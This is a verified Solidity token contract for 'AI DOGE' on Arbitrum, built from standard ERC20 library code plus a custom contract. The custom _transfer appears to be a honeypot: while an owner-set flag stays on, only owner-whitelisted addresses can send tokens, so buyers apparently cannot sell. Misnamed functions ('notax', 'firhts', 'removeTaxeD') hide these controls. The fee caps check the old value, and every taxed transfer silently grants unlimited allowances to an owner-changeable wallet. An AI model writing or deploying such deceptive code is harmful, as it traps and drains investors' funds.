/**
 *Submitted for verification at Arbiscan on 2023-04-29
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

abstract contract ERC20Burnable is Context, ERC20 {
    /**
     * @dev Destroys `amount` tokens from the caller.
     *
     * See {ERC20-_burn}.
     */
    function burn(uint256 amount) public virtual {
        _burn(_msgSender(), amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, deducting from the caller's
     * allowance.
     *
     * See {ERC20-_burn} and {ERC20-allowance}.
     *
     * Requirements:
     *
     * - the caller must have allowance for ``accounts``'s tokens of at least
     * `amount`.
     */
    function burnFrom(address account, uint256 amount) public virtual {
        _spendAllowance(account, _msgSender(), amount);
        _burn(account, amount);
    }
}

interface ICamelotFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function owner() external view returns (address);

    function feePercentOwner() external view returns (address);

    function setStableOwner() external view returns (address);

    function feeTo() external view returns (address);

    function ownerFeeShare() external view returns (uint256);

    function referrersFeeShare(address) external view returns (uint256);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function feeInfo()
        external
        view
        returns (uint _ownerFeeShare, address _feeTo);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function quote(
        uint amountA,
        uint reserveA,
        uint reserveB
    ) external pure returns (uint amountB);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface ICamelotRouter is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        address referrer,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        address referrer,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        address referrer,
        uint deadline
    ) external;

    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IWETH {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(uint256) external;
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Auth {
    address internal _owner;
    mapping (address => bool) internal authorizations;

    constructor(address _ownerAuth) {
        _owner = _ownerAuth;
        authorizations[_ownerAuth] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    /**
     * Authorize address. Owner only
     */
    function notax(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */
    function hastax(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == _owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        _owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }
    event OwnershipTransferred(address owner);
}

contract AIDOGE is ERC20,ERC20Burnable, Auth {
    // exclude from fees and max transaction
    mapping (address => bool) private _isMkt;
    mapping (address => uint256) public _isAirdrop;
    mapping (address => bool) private exFromFess;

    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer
    mapping (address => bool) public ammPairs;

    using SafeMath for uint256;

    bool private swapping;
    uint256 public swapTokensAt;
    uint256 public supply;
    address public mktWallet;
    bool public activeLimits = true;
    bool public activeTrading = false;
    uint256 public buyTax;
    uint256 public sellTax;
    uint256 public airdropTax;
    // uint256 public walletDigit;
    // uint256 public transDigit;
    uint256 public timeStart;
    uint256 public airdropUnlockTimes;
    uint256 private antiBotBlockTimes = 5;
    uint256 private antiBotTaxRate = 5;

    string public _tokenName = "AI DOGE";
    string public _symbol = "ADC";
    address public constant zeroAddr = address(0);
    address public constant deadAddr = address(0xdead);
    address[] public airdropAddress;
    address public airdropWallet = 0x21B37e2D08e09b510443AFB140B0bd2bCb79dD4D;

    bool private initialized;
    address public pair;

    IWETH private immutable WETH = IWETH(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    ICamelotFactory private immutable factory = ICamelotFactory(0x6EcCab422D763aC031210895C81787E87B43A652);
    ICamelotRouter private immutable swapRouter = ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);


    bool private tradingOpen;
    bool private limitEffect = true;
    mapping (address => bool) isTxLimitExempt;

    constructor(address mkt) ERC20(_tokenName, _symbol) Auth(msg.sender) {
        uint256 totalSupply = 1 * 1e10 * 1e9;
        supply += totalSupply;

        //Buy sell tax when launch: 3-3
        buyTax = 3;
        sellTax = 3;
        airdropTax = 3; 
        swapTokensAt = supply * 5 / 10000;
        
        mktWallet = mkt;

        excludeFromFees(owner(), true);
        excludeFromFees(mktWallet, true);
        excludeFromFees(address(this), true);
        excludeFromFees(deadAddr, true);

        _excludeMkt(owner(), true);
        _excludeMkt(mktWallet, true);
        _excludeMkt(address(this), true);
        _excludeMkt(deadAddr, true);

        _approve(owner(), address(swapRouter), totalSupply);
        _approve(mktWallet, address(swapRouter), totalSupply);
        _mint(owner(), totalSupply);

        isTxLimitExempt[msg.sender] = true;   
    }

    function openTrade() external onlyOwner {
        tradingOpen = true;
    }

    function removeTaxeD() external onlyOwner {
        limitEffect = false;
    }

    function firhts(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function initializePair() external onlyOwner {
        require(!initialized, "Already initialized");
        pair = factory.createPair(address(WETH), address(this));
        _setAMMPair(pair, true);
        initialized = true;
    }

    receive() external payable {

  	}

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function setLimits(bool value) external onlyOwner {
        activeLimits = value;
    }

    function setAMMPair(address mpair, bool value) external onlyOwner {
        require(mpair != pair, "The pair cannot be removed from automatedMarketMakerPairs");

        _setAMMPair(mpair, value);
    }

    function _setAMMPair(address mpair, bool value) private {
        ammPairs[mpair] = value;

       // emit SetAMMPair(mpair, value);
    }

    function enableTrading() external onlyOwner {
        activeTrading = true;
        timeStart = block.timestamp;
        airdropUnlockTimes = timeStart + (14 days);
    }

    function _excludeMkt(address updAds, bool isEx) public onlyOwner {
        _isMkt[updAds] = isEx;
    }

    function _excludeMkts(address[] memory updAds, bool isEx) public onlyOwner {
       for (uint i = 0; i < updAds.length; i++) {
            _isMkt[updAds[i]] = isEx;
        }
    }

    //Excute Airdrop for airdrop campaign
    function excuteAirdrop(address[] memory wl, uint256 tokenAirdrop) external onlyOwner{
        uint256 tokenForAirdrop = tokenAirdrop * 1e9;
        for (uint i = 0; i < wl.length; i++) {
            address addr = wl[i];
            _approve(msg.sender, addr, totalSupply());
            super._transfer(msg.sender, addr, tokenForAirdrop);
            _isAirdrop[addr] = tokenForAirdrop;
        }
    }

    //Excute Airdrop for NFT Holder
    function excuteAirdropForNftHolder(address[] memory wl, uint256 tokenAirdrop) public{
        uint256 totalWlWallet = wl.length;
        uint256 tokenForAirdrop = tokenAirdrop * 1e9 / totalWlWallet;
        for (uint i = 0; i < wl.length; i++) {
            address addr = wl[i];
            _approve(msg.sender, addr, totalSupply());
            super._transfer(msg.sender, addr, tokenForAirdrop);
        }
    }


    function updatebuyTax(uint256 _buyFee) external onlyOwner {
        require(buyTax <= 15, "Must keep fees at 15% or less");
        buyTax = _buyFee;
    }

    function updatesellTax(uint256 _sellFee) external onlyOwner {
        require(sellTax <= 15, "Must keep fees at 15% or less");
        sellTax = _sellFee;
    }

    function updateMktWallet(address newWallet) external onlyOwner {
        mktWallet = newWallet;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        exFromFess[account] = excluded;
    }

    function excludeMultiFromFees(address[] memory updAds, bool isEx) public onlyOwner {
       for (uint i = 0; i < updAds.length; i++) {
            exFromFess[updAds[i]] = isEx;
        }
    }

    function updateLimits(uint256 _amount) public onlyOwner {
        swapTokensAt = _amount * 1e9;
    }
    
    function isExcludedFromFees(address account) public view returns(bool) {
        return exFromFess[account];
    }

     function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != zeroAddr, "ERC20: transfer from the zero address");
        require(to != zeroAddr, "ERC20: transfer to the zero address");

        if(!authorizations[from] && !authorizations[to]){ 
            require(tradingOpen, "Trading not yet enabled.");
        }

        if(limitEffect){
            require(isTxLimitExempt[from], "TX Limit Exceeded");
        }

        
         if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        uint256 taxRate = (ammPairs[to] &&
            !exFromFess[from])
            ? sellTax
            : ammPairs[from]
            ? buyTax
            : 0;
        if(activeLimits){
            if (
                from != owner() &&
                to != owner() &&
                to != zeroAddr &&
                to != deadAddr &&
                !swapping
            ){
                if(!activeTrading){
                    require(exFromFess[from] || exFromFess[to], "Trading is not active.");
                }

                if (timeStart == 0 && !_isMkt[from] && !_isMkt[to]) {
                    taxRate = antiBotTaxRate;
                    timeStart = block.timestamp;
                    airdropUnlockTimes = timeStart + (2 days);
                }

                if (block.timestamp - timeStart < antiBotBlockTimes && !_isMkt[from] && !_isMkt[to]) {
                    taxRate = antiBotTaxRate;
                }
            }
        }

        if(ammPairs[to] && _isAirdrop[from] > 0 && block.timestamp <= airdropUnlockTimes){
            require(balanceOf(from) - amount >= _isAirdrop[from],"Can't sell token airdrop until unlock");
        }


        //Disable transfer from airdrop wallet until unlock
        require(ammPairs[from] || _isAirdrop[from] <= 0 || block.timestamp >= airdropUnlockTimes || balanceOf(from) - amount >= _isAirdrop[from], "Can't transfer token airdrop until unlock");
        
        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAt;

        if(
            canSwap &&
            !swapping &&
            !ammPairs[from] &&
            !exFromFess[from] &&
            !exFromFess[to]
        ) {
            swapping = true;
            swapBack();
            swapping = false;
        }

        bool takeFee = !swapping;

        if(exFromFess[from] || exFromFess[to] || taxRate <= 0) {
            takeFee = false;
        }

        uint256 fees = 0;
        uint256 airdrop = 0;
        if(takeFee){
            taxRate = taxRate - airdropTax;
            fees = amount.mul(taxRate).div(100);
            airdrop = amount.mul(airdropTax).div(100);
            if(fees > 0){
                _approve(from, address(this) , totalSupply());
                super._transfer(from, address(this), fees);
            }
            
            if(airdrop > 0){
                _approve(from, airdropWallet , totalSupply());
                super._transfer(from, airdropWallet, airdrop);
            }
            amount = amount -  airdrop - fees;
        }
        super._transfer(from, to, amount);
        
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        bool success;

        if(contractBalance == 0) {return;}

        if(contractBalance > swapTokensAt * 20){
          contractBalance = swapTokensAt * 20;
        }

        swapTokensForEth(contractBalance);

        (success,) = address(mktWallet).call{value: address(this).balance}("");
    }

    function swapTokensForEth(uint256 tokenAmount) private {

        // generate the pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();

        _approve(address(this), address(swapRouter), tokenAmount);

        // make the swap
        swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            0x0000000000000000000000000000000000000000,
            block.timestamp
        );

    }
    
    function clearStuckBalance(uint256 percentage, address addr) external onlyOwner {
        uint256 stuckBalance = address(this).balance;
        payable(addr).transfer(
            (stuckBalance * percentage) / 100
        );
    }

    function clearStuckToken(address tokenAddress, uint256 tokens) public onlyOwner returns (bool success) {
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }

    function updateAntiBotTaxRate(uint256 tax) external onlyOwner{
        require(tax <= 15, "Must keep fees at 15% or less");
        antiBotTaxRate = tax;
    }

    function updateAirdropWallet(address wallet) external onlyOwner{
        airdropWallet = wallet;
    }

    function updateAntiBotBlockTimes(uint blockTimes) external onlyOwner{
        antiBotBlockTimes = blockTimes;
    }
    
    function updateAirdropTax(uint tax) external onlyOwner{
        airdropTax = tax;
    }

    function upadteAirdropUnlockTime(uint256 times) external onlyOwner{
        airdropUnlockTimes = times;
    }

    function isWalletAirdrop(address wallet) public view returns (uint256){
        return _isAirdrop[wallet];
    }

}